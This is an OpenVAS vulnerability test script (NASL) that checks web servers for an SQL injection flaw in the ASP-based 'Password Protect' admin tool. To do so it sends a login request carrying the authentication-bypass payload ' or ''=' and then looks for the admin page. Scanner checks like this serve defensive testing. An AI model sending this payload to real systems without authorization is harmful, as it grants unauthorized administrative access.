# OpenVAS Vulnerability Test
# $Id: passwordprotect_sql_inject.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Password Protect SQL Injection
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Password Protect is a password protected script allowing you to manage a 
remote site through an ASP based interface.
 
An SQL Injection vulnerability in the product allows remote attackers to
inject arbitrary SQL statements into the remote database and to gain
administrative access on this service.";

tag_solution = "Upgrade to the latest version of this software";

# Contact: Criolabs <security@criolabs.net>
# Subject: Password Protect XSS and SQL-Injection vulnerabilities.
# Date: 	31.8.2004 02:17

if(description)
{
 script_id(14587);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-1647", "CVE-2004-1648");
 script_bugtraq_id(11073);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_name("Password Protect SQL Injection");
 
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Tests for the Password Protect Injection";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(
 "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n",
 "\r\n"
 );

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 v = eregmatch(pattern: "Set-Cookie: *([^; \t\r\n]+)", string: res);

 if (isnull(v)) exit(0); # Cookie is not available

 cookie = v[1];

 req = string(
 "POST /", dir, "/adminSection/index_next.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n",
 "Cookie: ", cookie, "\r\n",
 "Content-Type: application/x-www-form-urlencoded\r\n",
 "Content-Length: 57\r\n",
 "\r\n",
 "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\r\n"
 );

 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 req = string(
 "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
 "Host: ", get_host_name(), ":", port, "\r\n",
 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040823 Firefox/0.9.3\r\n",
 "Accept: */*\r\n",
 "Connection: close\r\n", 
 "Cookie: ", cookie, "\r\n",
 "\r\n");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ( "Web Site Administration" >< res  && "The Web Animations Administration Section" >< res )
 {
	security_hole(port);
	exit(0);
 }
}


